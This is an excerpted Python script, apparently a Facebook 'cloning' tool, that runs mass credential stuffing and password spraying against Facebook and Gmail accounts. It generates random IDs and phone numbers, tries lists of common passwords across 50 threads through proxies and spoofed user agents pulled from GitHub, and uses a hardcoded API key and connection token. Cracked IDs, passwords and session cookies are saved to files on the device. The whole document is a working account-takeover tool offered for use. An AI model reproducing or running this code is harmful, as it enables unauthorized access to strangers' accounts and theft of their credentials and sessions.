...
from concurrent.futures import ThreadPoolExecutor as spywork
from string import * 
...
try:
	prox= requests.get('https://raw.githubusercontent.com/Hacker25802/main1/main/proxies.txt').text
...
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Hacker25802/main1/main/strings.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Hacker25802/main1/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
for love in range(10000):
	...
	taniya = f'{ax}{bx}{cx}{dx}{ex}{fx}{gx}{hx}{ix}{jx}{kx}'
	shahin.append(taniya)
def randBuildvsskj():
    ...
    return ua
sys.stdout.write('\x1b]2; SPY\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo = """\x1b[1;93m
 ...
 ░█░ ██▄ █▀█ █░▀░█ █▄▄ █▀█ █░▀░█       
    \033[1;34m───────────────────────────────────────
    \033[1;31m[ \033[1;32mCODED BY \033[1;31m] \033[1;35m<>  \033[1;32mPrince TEAM CAM 
    \033[1;31m[ \033[1;32mPROGRAME \033[1;31m] \033[1;35m<>  \033[1;32mFacebook Cloning 
    \033[1;31m[ \033[1;32mWHATSAPP \033[1;31m] \033[1;35m<> \033[1;32m +8801606180506 
    \033[1;34m───────────────────────────────────────\033[1;37m"""
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(50*'_')
        input("Press enter to back SPY Menu ")
        exit()
...
def menu_apikey():
  ...
  server = requests.get(f'{tan}://{iya}.com/F{ani}122/vip/blob/main/a.txt')
  x1()
  x2()
  try:
    httpCaht = requests.get(f"{tan}://{iya}.com/F{ani}122/vip/blob/main/a.txt").text
    if id in httpCaht:
...
def sucrity():
	...
	menu_apikey()
	ckx()
	xnx=input(' Your Access password : ')
	if xnx in ["xm","Xm","XM","xM"]:
		pass
	else:
...
def Spy():   
    ...
    print(f'   [3] Gmail Cracking ')
    print(f'   [4] RANDOM India ')
    print(f'   [5] RANDOM Facebook uid ')
    print('')
...
def method_crack():
    global methods
    clear()
    print(f'    [1] Method {1}[API][MIX ID]')
    print(f'    [2] Method {2}[API][MIX ID]')
    print(f'    [3] Method {3}[API][MIX ID]')
    print('')
    print(f'    [4] Method {4}[VIP][NEW ID]')
    print(f'    [5] Method 5[VIP][MIX ID]')
    print(f'    [6] Method 6[VIP][MIX ID]')
    print(f'    [0] Back')
    print('')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.SPY-M1] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [TEAM CAM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TEAM CAM_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SPY_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [TEAM CAM-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/TEAM CAM_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.TEAM CAM-M3] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [TEAM CAM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TEAM CAM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SPY_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [TEAM CAM-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Mr.TEAM CAM-M2] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KINGb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KINGb};{ckkk}"
                    print(f"\r{A} [TEAM CAM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TEAM CAM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SPY_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{R} [TEAM CAM-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/TEAM CAM_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
    ...
    def methodF(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.TEAM CAM-M6] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [TEAM CAM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/TEAM CAM_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def methodE(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.TEAM CAM-M5] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Mr.TEAM CAM-M4] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def pasw(self):       
            ...
            print(50*'_')
            print(f'{S} Total IDs :\x1b[38;5;48m %s ' % len(self.id))
            print(f'{S} Cracking Started...')
            print(50*'_')
            with spywork(max_workers=50) as KINGworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def rand():
	clear()
	print('    [1] RANDOM CLONER SYSTEM VIP ')
	print('    [2] RANDOM CLONER SYSTEM API ')
	xxx=input('[★] Choice : ')
	if xxx in '1':
		rndm()
	if xxx in '2':
		...
		print(' whrong input. ');time.sleep(1)
		rand()
...
def rndm():
	...
	limit = int(input('[+] Put lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(8))
		uid.append(nmp)
	with spywork(max_workers=50) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		...
		for guru in uid:
			uid = kode+guru
			pwx = [uid,guru,guru[2:],kode+guru[:3],kode+guru[:4],guru[1:],'bangladesh','i love you','free fire','@#@#@#','islam123','jannat','taniya','fariya','alamin','nadiya','foysal','nusrat','tamanna','shahin']
			if mthd =='1':
...
def rndm1():
	...
	with spywork(max_workers=50) as yaari:
		...
		for guru in uid:
			uid = '+91'+kode+guru
			pwx = ['57273200',guru,kode+guru,kode[2:]+guru]
			#pwx = ['57273200']
			if mthd =='1':
				yaari.submit(acrack,uid,pwx,tl)
			if mthd =='2':
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[65:80]
				print('\033[1;92m[TEAM CAM-OK] '+cid+' | '+ps+'\033[1;32m')
				#print(f' Number or Email : {uid}')
				#print(f' Cookie : {coki}')
				open('TEAM CAM-VIP-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(uid)
				...
				cid = coki[82:97]
				print('\033[1;92m[TEAM CAM-OK] '+cid+' | '+ps+'\033[1;32m')
				open('TEAM CAM-cp.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(uid)
				break
			else:
				continue
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[82:97]
				print('\33[1;31m[TEAM CAM-CP] '+cid+' | '+ps+'\33[0;97m')
				open('TEAM CAM-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
...
def acrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMr.SPY-RNDM>M1\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen2)
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
